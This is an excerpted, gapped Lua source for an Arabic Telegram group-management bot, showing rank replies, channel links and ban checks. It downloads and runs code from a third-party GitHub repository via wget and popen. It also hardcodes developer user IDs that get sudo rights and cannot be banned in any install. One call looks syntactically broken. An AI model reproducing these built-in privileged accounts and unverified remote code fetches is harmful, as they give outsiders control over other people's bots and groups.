...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/HeA0/soso/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1001132193,88888888888888,999999999999999,66666666666666,77777777777777,55555555555555}   
...
var = true 
elseif tonumber(user_id) == tonumber(999999999999999) then
var = true  
elseif tonumber(user_id) == tonumber(88888888888888) then
var = true  
elseif tonumber(user_id) == tonumber(66666666666666) then
var = true  
elseif tonumber(user_id) == tonumber(77777777777777) then
var = true
  elseif tonumber(user_id) == tonumber(55555555555555) then
var = true
...
os.execute('wget https://raw.githubusercontent.com/HeA0/soso/main/DRAGON.lua')
...
if text == 'بارلو مبرمج السورس' and Debn(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'Ᏼ Ꭺ Ν Ꭰ Ꭺ~"𖥕𝖋_𝖔𝖋𝖋🇬🇺', url="t.me/bar_lo0o0"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'ՏΌႮᎡᏟᎬ ᎬᏙᎪᏞ', url="t.me/bar_lo0o0o0o0o"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
local Text = [[ 
[قناه سورس ايفل ادخل وتابع الجديد](t.me/bar_lo0o0o0o0o)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'ՏΌႮᎡᏟᎬ ᎬᏙᎪᏞ', url="t.me/bar_lo0o0o0o0o"}}, 
...
if tonumber(result.sender_user_id_) == tonumber(999999999999999) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(88888888888888) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(66666666666666) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(55555555555555) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(77777777777777) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if result.id_ == tonumber(999999999999999) then
send(msg.chat_id_, msg.id_, "  لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(88888888888888) then
send(msg.chat_id_, msg.id_, " ?? لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(77777777777777) then
send(msg.chat_id_, msg.id_, "  لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(66666666666666) then
send(msg.chat_id_, msg.id_, " ?? لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(55555555555555) then
send(msg.chat_id_, msg.id_, " ?? لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
if tonumber(userid) == tonumber(999999999999999) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(88888888888888) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(77777777777777) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(66666666666666) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(55555555555555) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if Debn(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/HeA0/soso/main/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/HeA0/soso/main/File_Bot/"..file)
if res == 200 then
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مطوري نور عنيا🥺🤍](t.me/bar_lo0o0o0o0o)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
send(msg.chat_id_, msg.id_,textt, 1, 'md'6) 
end 
end 
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil) 
return false
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مطوري الثاني حته مني 😍💚](t.me/bar_lo0o0o0o0o)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت المطور بس الصغنن 🌝💘](t.me/bar_lo0o0o0o0o)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[نت المالك هن يعني حاجه فوق فوق راسي 😂♥](t.me/bar_lo0o0o0o0o)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه??🤦‍♂️](t.me/bar_lo0o0o0o0o)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/bar_lo0o0o0o0o)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/bar_lo0o0o0o0o)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/bar_lo0o0o0o0o)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت مميز ابن ناس 😊 ](t.me/bar_lo0o0o0o0o)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ عضو قميل 🌝💘 ](t.me/bar_lo0o0o0o0o)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
send(msg.chat_id_,msg.id_, 'اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه ايفل ') 
return false
end
